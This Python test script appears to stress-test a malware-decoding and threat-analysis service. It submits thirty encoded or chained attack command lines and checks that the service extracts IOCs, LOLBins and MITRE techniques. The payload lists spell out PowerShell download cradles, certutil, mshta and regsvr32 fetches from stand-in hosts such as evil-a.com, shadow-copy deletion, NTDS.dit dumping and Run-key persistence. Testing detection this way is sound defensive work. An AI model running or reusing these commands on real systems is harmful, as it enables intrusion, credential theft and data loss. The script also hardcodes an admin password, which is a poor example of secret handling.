"""Deployment-readiness stress test.

- 20 huge/diverse command lines (single-stage encodings)
- 10 chained/multi-stage command lines
- Per-payload: verify decode succeeded, IOCs / LOLBins / MITRE surfaced,
  chain populated
- Verify /history lists them + /history/{iid} returns full detail
"""
from __future__ import annotations
import base64
import json
import os
import sys
import time
from typing import Any, Dict, List

import requests

# ── Auth ──────────────────────────────────────────────────────────
API = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/")
if not API:
    with open("/app/frontend/.env") as f:
        for ln in f:
            if ln.startswith("REACT_APP_BACKEND_URL="):
                API = ln.split("=", 1)[1].strip().rstrip("/")
                break

r = requests.post(f"{API}/api/auth/login",
                  json={"email":"admin@nivxray.com","password":"NivXRay#2026!"},
                  timeout=15)
r.raise_for_status()
H = {"Authorization": f"Bearer {r.json()['access_token']}",
     "Content-Type": "application/json"}
print(f"AUTH OK · {API}")


def b64(x: str) -> str:
    return base64.b64encode(x.encode()).decode()


def b64_utf16le(x: str) -> str:
    return base64.b64encode(x.encode("utf-16le")).decode()


# ── 20 single-stage huge command lines ─────────────────────────────
SINGLE: List[Dict[str, str]] = [
    {"name": "PS · b64 utf16le download-cradle",
     "input": (
        "powershell.exe -nop -w hidden -enc "
        + b64_utf16le('IEX(New-Object Net.WebClient).DownloadString("http://evil-a.com/a.ps1")')
     )},
    {"name": "PS · IEX DownloadString",
     "input": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil-b.com/b.ps1')\""},
    {"name": "PS · Invoke-Expression + FromBase64String",
     "input": (
        "powershell -c \"$s='"
        + b64('IEX((New-Object Net.WebClient).DownloadString("http://evil-c.com/c.ps1"))')
        + "';iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s)))\""
     )},
    {"name": "PS · Start-BitsTransfer",
     "input": "powershell.exe -c \"Start-BitsTransfer -Source http://evil-d.com/d.exe -Destination C:\\\\Temp\\\\d.exe\""},
    {"name": "certutil · urlcache download",
     "input": "certutil.exe -urlcache -split -f https://evil-e.com/e.txt e.txt"},
    {"name": "certutil · decode base64",
     "input": "certutil.exe -decode encoded_stager.b64 payload.exe"},
    {"name": "mshta · remote HTA",
     "input": "mshta.exe http://evil-f.com/f.hta"},
    {"name": "rundll32 · JavaScript proxy",
     "input": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");"},
    {"name": "regsvr32 · Squiblydoo",
     "input": "regsvr32.exe /s /n /u /i:http://evil-g.com/g.sct scrobj.dll"},
    {"name": "msiexec · remote MSI",
     "input": "msiexec.exe /i https://evil-h.com/setup.msi /quiet"},
    {"name": "bitsadmin · transfer job",
     "input": "bitsadmin /transfer myjob /priority high http://evil-i.com/i.exe C:\\\\Users\\\\Public\\\\i.exe"},
    {"name": "wmic · remote process create",
     "input": "wmic /node:10.0.0.5 process call create \"cmd.exe /c powershell -w hidden -c IEX(iwr http://evil-j.com/j.ps1)\""},
    {"name": "schtasks · persistence",
     "input": "schtasks.exe /create /sc onlogon /tn \\\"WindowsHealth\\\" /tr \\\"powershell -c iex(iwr http://evil-k.com/k.ps1)\\\""},
    {"name": "hex-encoded PowerShell",
     "input": "706f7765727368656c6c2e657865202d4e6f50202d6320224945582028694f2073676574202868747470733a2f2f6576696c2d6c2e636f6d2f6c2e70733129292220"},
    {"name": "double-b64",
     "input": b64(b64("cmd.exe /c whoami > \\\\evil-m.com\\\\share\\\\out.txt"))},
    {"name": "ROT13 obfuscated",
     "input": "cbjreFuryy.rkr -Abc -jvaqbjrfglyr uvqqra -PbzznaqEbjreFuryy.rkr"},
    {"name": "URL-encoded",
     "input": "powershell%20-c%20%22IEX(iwr%20http://evil-n.com/n.ps1)%22"},
    {"name": "cmd batch chain",
     "input": "cmd.exe /c \"set X=whoami && %X% & net user & schtasks /create /sc daily /tn foo /tr calc.exe\""},
    {"name": "vssadmin · shadow delete (ransom precursor)",
     "input": "vssadmin.exe delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} recoveryenabled No"},
    {"name": "wscript · VBS launcher",
     "input": "wscript.exe //nologo dropper.vbs /param:http://evil-o.com/o.dll"},
]

# ── 10 chain / multi-stage payloads (each intentionally spans ≥ 2 LOLBAS
#    stages: download → decode → execute → persist)
CHAINS: List[Dict[str, str]] = [
    {"name": "certutil download+decode+rundll32+schtasks",
     "input": "powershell.exe -nop -w hidden -c \"certutil.exe -urlcache -f https://c1.example/m.txt m.txt; certutil.exe -decode m.txt m.dll; rundll32.exe m.dll,EntryPoint; schtasks.exe /create /sc daily /tn foo /tr m.dll\""},
    {"name": "bitsadmin + regsvr32 squiblydoo + reg persistence",
     "input": "bitsadmin /transfer j http://c2.example/s.sct C:\\s.sct & regsvr32 /s /n /u /i:C:\\s.sct scrobj.dll & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d s.exe"},
    {"name": "wget + chmod + persistence (linux flavour)",
     "input": "cmd /c \"curl.exe -o c.exe http://c3.example/c.exe && c.exe && schtasks /create /tn foo /tr c.exe /sc onlogon\""},
    {"name": "b64 wrap → certutil → mshta chain",
     "input": (
        "powershell -enc "
        + b64_utf16le("certutil.exe -urlcache -f http://c4.example/x.hta x.hta; mshta.exe x.hta")
     )},
    {"name": "msi remote + wmic pivot + credential dump",
     "input": "msiexec /i http://c5.example/setup.msi /quiet && wmic /node:10.0.0.7 process call create cmd.exe && esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d ntds.dit"},
    {"name": "installutil AWL bypass + schtasks",
     "input": "installutil.exe /LogToConsole=false /U C:\\a.exe && schtasks /create /sc hourly /tn keepalive /tr C:\\a.exe"},
    {"name": "netsh portproxy + net user + wmic",
     "input": "netsh interface portproxy add v4tov4 listenport=445 connectaddress=10.0.0.9 & net user admin Pass!2026 /add & wmic useraccount where name='admin' set passwordexpires=false"},
    {"name": "long PowerShell b64 double-wrap",
     "input": (
        "powershell.exe -nop -w hidden -enc "
        + b64_utf16le('powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://c8.example/final.ps1\')"')
     )},
    {"name": "rot13 wrap → base64 → powershell",
     "input": (
        "powershell -c \"$decoded="
        + b64('cbjreFuryy.rkr -Abc -j uvqqra -p vrk(vje uggc://p9.rknzcyr/z.cf1)')
        + ";iex $decoded\""
     )},
    {"name": "shellcode-style hex + rundll32 + persistence",
     "input": "cmd /c \"echo 4d5a90000300000004000000ffff | certutil -decodehex - h.exe & rundll32 h.exe,Main & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Svc /d h.exe\""},
]


def analyze(payload: str) -> Dict[str, Any]:
    """Hit the real decode endpoint (`/api/decode/smart`) — this actually
    walks the pipeline (deterministic + magic + reasoning) and produces
    `output`, `recipe`, `verdict_card`, `confidence` etc."""
    r = requests.post(f"{API}/api/decode/smart", headers=H,
                      json={"input": payload, "analysis_mode": "balanced"},
                      timeout=60)
    if r.status_code != 200:
        return {"_error": f"HTTP {r.status_code}: {r.text[:200]}"}
    body = r.json()
    # Enrichment pass — hit /api/analyze for IOCs + LOLBins + MITRE.
    try:
        r2 = requests.post(f"{API}/api/analyze", headers=H,
                           json={"input": body.get("output") or payload},
                           timeout=60)
        if r2.status_code == 200:
            enrich = r2.json()
            body.setdefault("iocs", enrich.get("iocs") or {})
            # /api/analyze returns the LOLBAS hits under the key `lolbas`
            # (historical). Normalise to `lolbins` for the score helper.
            body.setdefault("lolbins", enrich.get("lolbas") or enrich.get("lolbins") or [])
            body.setdefault("mitre", enrich.get("mitre") or [])
            body.setdefault("ai_verdict", enrich.get("ai_verdict"))
    except Exception:
        pass
    return body


def score(res: Dict[str, Any]) -> Dict[str, Any]:
    if "_error" in res:
        return {"pass": False, "reason": res["_error"]}
    output = res.get("output") or ""
    iocs = res.get("iocs") or {}
    lolbins = res.get("lolbins") or []
    mitre = res.get("mitre") or []
    # `/api/decode/smart` returns the chain under `recipe`; other endpoints
    # return `chain`. Support both.
    chain = res.get("chain") or res.get("recipe") or []
    verdict = res.get("verdict_card") or {}
    return {
        "pass": bool(output and len(output) > 0),
        "out_chars": len(output),
        "urls": len(iocs.get("urls") or []),
        "ips": len(iocs.get("ips") or []),
        "domains": len(iocs.get("domains") or []),
        "lolbins": len(lolbins),
        "mitre": len(mitre),
        "chain_steps": len(chain) if isinstance(chain, list) else 0,
        "verdict": verdict.get("verdict") or verdict.get("label") or res.get("ai_verdict") or "-",
        "confidence": res.get("confidence"),
        "engine": res.get("engine"),
    }


# ── Run tests ──────────────────────────────────────────────────────
results = []
start = time.time()

print(f"\n{'━'*72}\nSINGLE-STAGE (20)\n{'━'*72}")
for i, p in enumerate(SINGLE, 1):
    t0 = time.time()
    res = analyze(p["input"])
    s = score(res)
    s["group"] = "single"
    s["name"] = p["name"]
    s["dt_ms"] = int((time.time() - t0) * 1000)
    results.append(s)
    tag = "✓" if s["pass"] else "✗"
    print(f"{tag} {i:2d}/20 {s['dt_ms']:5d}ms  {p['name'][:60]:60s}"
          f"  out={s.get('out_chars',0):4d}c  urls={s.get('urls',0)}"
          f"  lolbins={s.get('lolbins',0)}  chain={s.get('chain_steps',0)}"
          f"  verdict={s.get('verdict') or '-'}")

print(f"\n{'━'*72}\nCHAIN (10)\n{'━'*72}")
for i, p in enumerate(CHAINS, 1):
    t0 = time.time()
    res = analyze(p["input"])
    s = score(res)
    s["group"] = "chain"
    s["name"] = p["name"]
    s["dt_ms"] = int((time.time() - t0) * 1000)
    results.append(s)
    tag = "✓" if s["pass"] else "✗"
    print(f"{tag} {i:2d}/10 {s['dt_ms']:5d}ms  {p['name'][:60]:60s}"
          f"  out={s.get('out_chars',0):4d}c  urls={s.get('urls',0)}"
          f"  lolbins={s.get('lolbins',0)}  chain={s.get('chain_steps',0)}"
          f"  verdict={s.get('verdict') or '-'}")

# ── Summary ────────────────────────────────────────────────────────
total = len(results)
passed = sum(1 for r in results if r["pass"])
tot_dt = int(time.time() - start)
avg_ms = int(sum(r["dt_ms"] for r in results) / max(1, total))
print(f"\n{'━'*72}\nSUMMARY")
print(f"  Passed              : {passed}/{total}  ({100 * passed // total}%)")
print(f"  Wall time           : {tot_dt}s")
print(f"  Avg per payload     : {avg_ms}ms")
print(f"  With LOLBins        : {sum(1 for r in results if r.get('lolbins',0) > 0)}")
print(f"  With IOC URLs       : {sum(1 for r in results if r.get('urls',0) > 0)}")
print(f"  With MITRE          : {sum(1 for r in results if r.get('mitre',0) > 0)}")
print(f"  With chain steps    : {sum(1 for r in results if r.get('chain_steps',0) > 0)}")

# ── History integrity check ────────────────────────────────────────
print(f"\n{'━'*72}\nHISTORY CHECK")
r = requests.get(f"{API}/api/history?limit=50", headers=H, timeout=10)
r.raise_for_status()
hist = r.json()
items = hist if isinstance(hist, list) else hist.get("items", [])
print(f"  /history returned   : {len(items)} items")
if items:
    first = items[0]
    iid = first.get("id") or first.get("iid") or first.get("_id")
    print(f"  Sample iid          : {iid}")
    r2 = requests.get(f"{API}/api/history/{iid}", headers=H, timeout=15)
    if r2.status_code == 200:
        d = r2.json()
        keys = sorted(k for k in d.keys() if not k.startswith("_"))
        print(f"  /history/{{iid}} keys : {', '.join(keys)}")
        # verify critical fields exist (history stores previews of large blobs)
        must = ["input_preview", "output_preview", "iocs", "mitre", "chain", "verdict_card"]
        missing = [k for k in must if k not in d]
        print(f"  Missing critical    : {missing or 'NONE'}")
        # Sanity: preview is non-empty
        if d.get("input_preview"):
            print(f"  Sample preview      : {d['input_preview'][:120]!r}")
    else:
        print(f"  /history/{{iid}}     : HTTP {r2.status_code}")

# Persist for review
with open("/tmp/deploy_readiness.json", "w") as f:
    json.dump({"results": results, "summary": {"passed": passed, "total": total,
               "avg_ms": avg_ms, "wall_s": tot_dt}}, f, indent=2)
print(f"\n  Detail dump         : /tmp/deploy_readiness.json")

sys.exit(0 if passed == total else 1)
